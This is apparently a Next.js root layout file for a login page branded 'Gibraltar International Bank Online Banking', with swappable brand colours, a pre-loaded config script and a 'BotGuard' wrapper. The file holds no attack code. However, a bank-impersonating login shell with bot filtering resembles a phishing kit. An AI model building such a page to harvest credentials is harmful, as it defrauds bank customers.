import type { Metadata } from "next";
import { Lato } from "next/font/google";
import "./globals.css";
import Script from "next/script";
import { brandCSSVariables } from "@/config/branding";
import { BotGuard } from "@/components/security/BotGuard";

const lato = Lato({
  variable: "--font-lato",
  subsets: ["latin"],
  weight: ["100", "300", "400", "700", "900"],
});

export const metadata: Metadata = {
  title: "Login to Gibraltar International Bank Online Banking",
  description: "Securely sign in to Gibraltar International Bank",
  icons: {
    icon: '/logo.svg',
  },
};

// Map brand variables to the names expected by globals.css
const style = {
  '--primary': brandCSSVariables['--color-primary'],
  '--secondary': brandCSSVariables['--color-secondary'],
  '--accent': brandCSSVariables['--color-accent'],
} as React.CSSProperties;

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <body
        className={`${lato.variable} antialiased`}
        style={style}
      >
        <Script src="/config.js" strategy="beforeInteractive" />
        <BotGuard>
          {children}
        </BotGuard>
      </body>
    </html>
  );
}
